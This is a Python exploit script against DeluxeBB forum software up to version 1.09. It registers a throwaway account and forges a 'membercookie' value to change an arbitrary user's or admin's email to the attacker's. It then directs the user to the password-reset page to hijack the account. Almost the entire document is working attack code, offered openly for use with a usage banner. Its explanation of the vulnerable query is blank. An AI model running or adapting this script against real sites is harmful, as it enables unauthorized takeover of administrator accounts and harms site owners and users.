DeluxeBB <= 1.09 Remote Admin Email Change Exploit
==================================================




#!/usr/bin/python
#-*- coding: iso-8859-15 -*-
&#039;&#039;&#039;
 _ __   _____  _____ _ __  
| &#039;_ \ / _ \ \/ / _ \ &#039;_ \ 
| | | |  __/>  <  __/ | | |
|_| |_|\___/_/\_\___|_| |_|

------------------------------------------------------------------------------------------------
AÂ§ DeluxeBB 0day Remote Change Admin&#039;s credentials AÂ§
------------------------------------------------------------------------------------------------
nexen
------------------------------------------------------------------------------------------------
PoC / Bug Explanation: 
When you update your profile,
DeluxeBB execute a vulnerable query:


So, editing cookie "membercookie" you can change remote user&#039;s email.

Enjoy ;)
------------------------------------------------------------------------------------------------

&#039;&#039;&#039;


import httplib, urllib, sys, md5
from random import randint
print "\n########################################################################################"
print "                    DeluxeBB <= 1.09 Remote Admin&#039;s/User&#039;s Email Change                   "
print "                                                                                          "
print "                            Vulnerability Discovered By Nexen                             "          
print "                        Greetz to The:Paradox that Coded the Exploit.                     "
print "                                                                                          "
print " Usage:                                                                                   " 
print " %s [Target] [VictimNick] [Path] [YourEmail] [AdditionalFlags]                            " % (sys.argv[0])
print "                                                                                          "	
print " Additional Flags:                                                                        "	
print " -id34 -passMypassword -port80                                                            "	
print "                                                                                          "	
print " Example:                                                                                 " 			
print " python %s 127.0.0.1 admin /DeluxeBB/ me@it.com -port81                                   " % (sys.argv[0])
print "                                                                                          "	
print "########################################################################################\n"
if len(sys.argv)<=4:	sys.exit()
else:   print "[.]Exploit Starting."		

target = sys.argv[1]
admin_nick = sys.argv[2]
path = sys.argv[3]
real_email = sys.argv[4]

botpass = "the-new-administrator"
rand = randint(1, 99999)
dn1 = 0
dn2 = 0
dn3 = 0

try:
 for line in sys.argv[:]:
	if line.find(&#039;-pass&#039;) != -1 and dn1 == 0:
		upass = line.split(&#039;-pass&#039;)[1]
		dn1 = 1
	elif line.find(&#039;-pass&#039;) == -1 and dn1 == 0:
		upass = ""
	if line.find(&#039;-id&#039;) != -1 and dn2 == 0:
		userid = line.split(&#039;-id&#039;)[1]
		dn2 = 1
	elif line.find(&#039;-id&#039;) == -1 and dn2 == 0:
		userid = ""

	if line.find(&#039;-port&#039;) != -1 and dn3 == 0:
		port = line.split(&#039;-port&#039;)[1]
		dn3 = 1
	elif line.find(&#039;-port&#039;) == -1 and dn3 == 0:
		port = "80"
except:
	sys.exit("[-]Some error in Additional Flag.")
if upass=="" and userid != "" or userid == "" and upass != "": 
	print "[-]Bad Additional flags -id -pass given, ignoring them." 
	upass=""
	userid=""
############################################################################################Trying to connect.
try: 	
	conn = httplib.HTTPConnection(target,port)
	conn.request("GET", "")
except: sys.exit("[-]Cannot connect. Check Target.")
############################################################################################Registering a new user if id or upass not defined
try:
	conn = httplib.HTTPConnection(target,port)
	if upass == "" or userid == "":
		conn.request("POST", path + "misc.php?sub=register", urllib.urlencode({&#039;submit&#039;: &#039;Register&#039;,&#039;name&#039;: &#039;th331337.%d&#039; % (rand) , &#039;pass&#039;: botpass,&#039;pass2&#039;: botpass,&#039;email&#039;: &#039;root%d@yoursystemgotpowned.it&#039; % (rand) }), {"Accept": "text/plain","Content-type": "application/x-www-form-urlencoded"})
		response = conn.getresponse()
		cookies = response.getheader(&#039;set-cookie&#039;).split(";")
		#print "\n\nth331337.%d \n\nthe-new-administrator" % (rand)
		print "[.]Registering a new user. -->",response.status, response.reason
		conn.close()
############################################################################################Getting memberid in Cookies
		for line in cookies[:]:
			if line.find(&#039;memberid&#039;) != -1:
				mid = line.split(&#039;memberid=&#039;)[1]
############################################################################################Isset like starts
		try: mid
		except NameError: sys.exit("[-]Can&#039;t Get \"memberid\". Failed. Something has gone wrong. If you have not done yet, you may have to register manually and use flags -id -pass")
except AttributeError:
	sys.exit("[-]AttributeError Check your Target/path.")
############################################################################################Doing some Md5
if upass=="" or userid=="":
	hash = md5.new()
	hash.update(botpass)
	passmd5 = hash.hexdigest()
else:
	hash = md5.new()
	hash.update(upass)
	passmd5 = hash.hexdigest()
	mid = userid
############################################################################################Updating "victim" email in Profile
conn = httplib.HTTPConnection(target,port)
conn.request("POST", path+"cp.php?sub=settings", urllib.urlencode({&#039;submit&#039;: &#039;Update&#039;,&#039;xemail&#039;: real_email}), {"Accept": "text/plain","Cookie": "memberid="+mid+"; membercookie="+admin_nick+";memberpw="+passmd5+";" ,"Content-type": "application/x-www-form-urlencoded"})
response = conn.getresponse()
print "[.]Changing \""+admin_nick+"\" Email With \"" + real_email + "\" -->",response.status, response.reason
conn.close()
print "[+]All Done! Email changed!!!\n\n You can reset \""+admin_nick+"\" password here -> "+target+path+"misc.php?sub=lostpw :D\n\n Have Fun =)\n"




